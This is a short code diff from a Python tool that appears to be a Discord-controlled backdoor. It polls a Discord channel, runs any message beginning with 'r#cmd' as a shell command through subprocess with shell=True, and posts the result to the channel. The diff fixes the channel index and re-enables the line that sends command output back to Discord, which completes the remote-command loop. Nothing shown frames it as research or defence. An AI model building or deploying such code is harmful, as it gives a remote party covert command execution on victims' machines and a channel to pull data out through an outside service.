@@ -31,7 +31,7 @@ class Discord:
             print("Success.")
 
     def send_message(self, msg):
-        response = urlopen(Request(f"https://discord.com/api/v9/channels/{channel_id[1]}/messages", headers=self.headers, data=json.dumps({"content": msg}).encode(), method="POST"))
+        response = urlopen(Request(f"https://discord.com/api/v9/channels/{channel_id[0]}/messages", headers=self.headers, data=json.dumps({"content": msg}).encode(), method="POST"))
         if response.getcode() == 200:
             print("Success.")
 
@@ -53,7 +53,7 @@ class Discord:
             if self.message_content().startswith("r#cmd"):
                 cmd = self.message_content().strip("r#cmd ")
                 proc = subprocess.Popen(cmd.split(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                #self.send_message(f"```{proc}```")
+                self.send_message(f"```{proc}```")
             time.sleep(0.5) 
 
 if __name__ == "__main__":
